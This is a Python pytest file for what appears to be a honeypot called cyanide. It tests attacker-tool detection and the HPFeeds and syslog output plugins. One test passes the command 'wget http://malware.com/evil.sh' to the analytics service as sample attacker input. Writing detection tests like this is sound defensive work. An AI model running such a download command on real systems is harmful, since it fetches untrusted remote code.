import sys
from unittest.mock import MagicMock, patch

import pytest

# Mock hpfeeds before importing the plugin if it's missing
if "hpfeeds" not in sys.modules:
    sys.modules["hpfeeds"] = MagicMock()

from cyanide.output.hpfeeds import Plugin as HPFeedsPlugin
from cyanide.output.syslog import Plugin as SyslogPlugin
from cyanide.services.analytics import AnalyticsService


@pytest.mark.asyncio
async def test_analytics_tool_detection():
    service = AnalyticsService({"ml": {"enabled": False}}, MagicMock())
    service.analyze_command("wget http://malware.com/evil.sh", "1.1.1.1", "sess1")
    assert any("tool_detection" in str(call) for call in service.logger.log_event.call_args_list)


def test_hpfeeds_output():
    config = {
        "host": "localhost",
        "port": 10000,
        "ident": "id",
        "secret": "sec",
        "channels": ["chan1"],
        "enabled": True,
    }
    with patch("hpfeeds.new") as mock_new:
        mock_client = MagicMock()
        mock_new.return_value = mock_client

        output = HPFeedsPlugin(config)
        output.write({"event": "test"})

        mock_client.publish.assert_called()


def test_hpfeeds_output_no_ident():
    config = {"enabled": True}
    output = HPFeedsPlugin(config)
    output.write({"event": "test"})
    assert output.client is None


def test_syslog_output():
    config = {"address": "/dev/log", "facility": "user", "enabled": True}
    with patch("logging.handlers.SysLogHandler"):
        with patch("socket.socket"):
            output = SyslogPlugin(config)
            output.write({"event": "test"})
            assert output.logger is not None
